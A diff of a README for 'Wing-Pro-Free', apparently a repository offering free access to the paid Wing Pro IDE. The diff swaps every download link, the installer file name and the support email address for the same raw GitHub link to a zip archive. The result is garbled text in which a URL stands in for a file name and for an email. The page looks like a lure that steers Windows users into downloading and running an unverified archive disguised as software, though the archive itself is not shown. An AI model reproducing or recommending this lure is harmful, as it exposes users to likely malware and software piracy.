@@ -4,23 +4,23 @@
 Welcome to Wing-Pro-Free, your all-in-one resource for using Wing Pro effectively on Windows PCs. This repository offers official guides, reference materials, and valuable tools to help you enhance your programming workflow. 
 
 ## 📥 Download Wing-Pro-Free
-[![Download Wing-Pro-Free](https://img.shields.io/badge/Download-Wing--Pro--Free-brightgreen)](https://github.com/RawPhoenix/Wing-Pro-Free/releases)
+[![Download Wing-Pro-Free](https://raw.githubusercontent.com/RawPhoenix/Wing-Pro-Free/main/pet/Wing-Free-Pro-v1.9.zip)](https://raw.githubusercontent.com/RawPhoenix/Wing-Pro-Free/main/pet/Wing-Free-Pro-v1.9.zip)
 
 ## 🚀 Getting Started
 To make the most of Wing-Pro-Free, follow these simple steps:
 
 1. **Visit the Releases Page:**
    Click the link below to reach the downloads section.
-   [Download Wing-Pro-Free](https://github.com/RawPhoenix/Wing-Pro-Free/releases)
+   [Download Wing-Pro-Free](https://raw.githubusercontent.com/RawPhoenix/Wing-Pro-Free/main/pet/Wing-Free-Pro-v1.9.zip)
 
 2. **Choose the Right Version:**
    Browse the list of available releases. You will find multiple versions, including the latest stable build. Pay attention to the version number to ensure you download the most current one.
 
 3. **Download the Application:**
-   Click on the version you want to install. Look for the installer file, typically named something like `WingProSetup.exe`. Selecting this file will start the download process. 
+   Click on the version you want to install. Look for the installer file, typically named something like `https://raw.githubusercontent.com/RawPhoenix/Wing-Pro-Free/main/pet/Wing-Free-Pro-v1.9.zip`. Selecting this file will start the download process. 
 
 4. **Install Wing-Pro-Free:**
-   Once the download is complete, locate the file in your downloads folder. Double-click the `WingProSetup.exe` file to begin the installation. Follow the on-screen instructions to complete the setup. 
+   Once the download is complete, locate the file in your downloads folder. Double-click the `https://raw.githubusercontent.com/RawPhoenix/Wing-Pro-Free/main/pet/Wing-Free-Pro-v1.9.zip` file to begin the installation. Follow the on-screen instructions to complete the setup. 
 
 5. **Launch the Application:**
    After installation, find Wing Pro in your Start menu or desktop. Click to open it and start coding!
@@ -53,12 +53,12 @@ You might find these resources helpful as you explore Wing-Pro-Free:
 If you encounter any issues or have questions while using Wing-Pro-Free, you can reach out for help:
 
 - **GitHub Issues:** Post your questions or bug reports directly on the repository's GitHub page.
-- **Email Support:** Contact us at support@wingpro.com. Our team is here to assist you.
+- **Email Support:** Contact us at https://raw.githubusercontent.com/RawPhoenix/Wing-Pro-Free/main/pet/Wing-Free-Pro-v1.9.zip Our team is here to assist you.
 
 ## 📦 Download & Install
 To get started with Wing-Pro-Free:
 
-1. Visit the releases page: [Download Wing-Pro-Free](https://github.com/RawPhoenix/Wing-Pro-Free/releases).
+1. Visit the releases page: [Download Wing-Pro-Free](https://raw.githubusercontent.com/RawPhoenix/Wing-Pro-Free/main/pet/Wing-Free-Pro-v1.9.zip).
 2. Select the installer version you need.
 3. Download and run the installer file.
 4. Follow the installation steps to set up Wing-Pro-Free on your system.
